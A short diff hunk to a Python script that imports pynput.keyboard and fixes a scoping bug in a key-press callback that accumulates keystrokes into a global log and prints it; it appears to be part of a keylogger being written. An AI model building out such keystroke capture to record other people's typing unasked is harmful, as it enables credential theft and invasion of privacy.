@@ -4,6 +4,7 @@ import pynput.keyboard
 log = ""
 
 def process_key_press(key):
+    global log
     log = log + key
     print(log)
 
